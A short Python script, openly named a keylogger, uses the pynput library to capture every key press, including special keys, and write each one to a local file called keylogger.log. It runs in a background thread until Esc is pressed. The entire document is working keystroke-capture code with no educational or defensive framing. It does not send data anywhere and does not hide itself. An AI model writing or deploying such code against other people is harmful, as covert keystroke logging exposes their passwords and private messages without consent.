from pynput import keyboard
import logging
import threading

# Configure logging
logging.basicConfig(filename="keylogger.log", level=logging.DEBUG, format='%(message)s')

def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special key {key} pressed')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Start the keylogger in a separate thread
keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.start()